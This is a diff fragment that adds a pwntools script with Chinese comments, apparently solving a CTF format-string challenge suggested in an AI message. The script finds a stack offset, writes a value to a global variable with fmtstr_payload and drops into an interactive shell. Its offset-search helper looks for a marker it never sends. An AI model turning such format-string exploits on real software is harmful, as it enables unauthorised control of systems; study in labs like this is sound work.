@@ -114,3 +114,43 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit the fo
  'shell. Pwntools simplifies this process by providing functions to craft the '
  'necessary payloads, allowing us to focus on the logic of the exploit rather '
  'than the intricate details of format string attacks.')
+
+
+from pwn import *
+
+# 设置pwntools上下文
+context(os='linux', arch='i386')  # 根据目标二进制文件调整操作系统和架构
+
+# 启动易受攻击的二进制进程（替换 './vuln_binary' 为实际二进制文件名）
+p = process('./vuln_binary')
+
+# 全局变量 'x' 的地址
+x_addr = 0x804A02C
+
+# 函数用于查找正确的格式化字符串偏移量
+def find_offset():
+    for i in range(1, 50):
+        payload = f'%{i}$p'
+        p.sendlineafter('input:', payload)
+        response = p.recvline()
+        if b'0x41414141' in response:
+            print(f'Found offset at position {i}')
+            return i
+    print('Offset not found, using default offset 7')
+    return 7  # 默认偏移量，必要时调整
+
+# 假设我们控制了格式化字符串，我们将假设偏移量已知
+# 如果需要动态查找偏移量，请取消注释以下行
+# payload = b'A' * 4  # 发送 'AAAA' 以在内存中检测
+# p.sendline(payload)
+# offset = find_offset()
+offset = 7  # 根据你的发现进行调整
+
+# 创建有效载荷以将值 '4' 写入 'x_addr'
+payload = fmtstr_payload(offset, {x_addr: 4})
+
+# 发送有效载荷
+p.sendlineafter('input:', payload)
+
+# 与shell互动
+p.interactive()
